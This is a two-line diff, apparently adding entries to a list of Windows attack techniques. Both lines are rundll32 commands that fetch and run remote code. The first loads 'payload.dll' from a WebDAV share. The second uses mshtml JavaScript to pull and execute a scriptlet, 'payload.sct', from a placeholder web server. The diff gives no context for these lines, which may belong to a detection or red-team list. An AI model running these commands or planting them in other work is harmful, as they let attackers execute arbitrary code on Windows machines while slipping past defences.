@@ -1,0 +1,2 @@
+rundll32 \\webdavserver\folder\payload.dll,entrypoint
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
